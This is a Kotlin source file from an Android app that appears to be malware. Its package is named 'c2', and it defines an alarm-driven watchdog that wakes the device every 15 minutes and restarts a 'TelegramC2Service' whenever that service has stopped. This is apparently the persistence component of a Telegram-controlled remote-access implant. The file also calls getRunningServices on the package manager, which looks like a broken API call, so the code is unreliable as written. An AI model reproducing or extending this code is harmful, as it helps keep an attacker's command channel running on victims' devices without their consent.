package com.outcome.c2

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.SystemClock
import android.util.Log

/**
 * Alarm-based watchdog. Schedules a periodic check that restarts
 * TelegramC2Service if it's stopped.
 */
class WatchdogReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "Watchdog"
        private const val INTERVAL_MS = 15L * 60L * 1000L
        private const val REQ_CODE = 0xC2

        fun schedule(ctx: Context) {
            try {
                val am = ctx.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                val intent = Intent(ctx, WatchdogReceiver::class.java).apply {
                    action = "com.outcome.c2.WATCHDOG"
                }
                val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                else
                    PendingIntent.FLAG_UPDATE_CURRENT
                val pi = PendingIntent.getBroadcast(ctx, REQ_CODE, intent, flags)

                val triggerAt = SystemClock.elapsedRealtime() + INTERVAL_MS
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    if (am.canScheduleExactAlarms()) {
                        am.setExactAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi
                        )
                    } else {
                        am.setAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi
                        )
                    }
                } else {
                    am.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi
                    )
                }
                Log.i(TAG, "scheduled next check in ${INTERVAL_MS / 60000} min")
            } catch (e: Exception) {
                Log.w(TAG, "schedule failed: ${e.message}")
            }
        }
    }

    override fun onReceive(ctx: Context, intent: Intent) {
        Log.i(TAG, "watchdog tick")
        LogBus.append(ctx.applicationContext, "WD", "watchdog tick")

        schedule(ctx)

        try {
            val pm = ctx.packageManager
            @Suppress("DEPRECATION")
            val services = pm.getRunningServices(Int.MAX_VALUE)
            val running = services.any {
                it.service.className == TelegramC2Service::class.java.name
            }
            if (!running) {
                Log.i(TAG, "TelegramC2Service not running — starting")
                LogBus.append(ctx.applicationContext, "WD", "restarting service")
                val svc = Intent(ctx, TelegramC2Service::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    ctx.startForegroundService(svc)
                } else {
                    ctx.startService(svc)
                }
            } else {
                Log.i(TAG, "service is running — ok")
            }
        } catch (e: Exception) {
            Log.w(TAG, "check failed: ${e.message}")
        }
    }
}
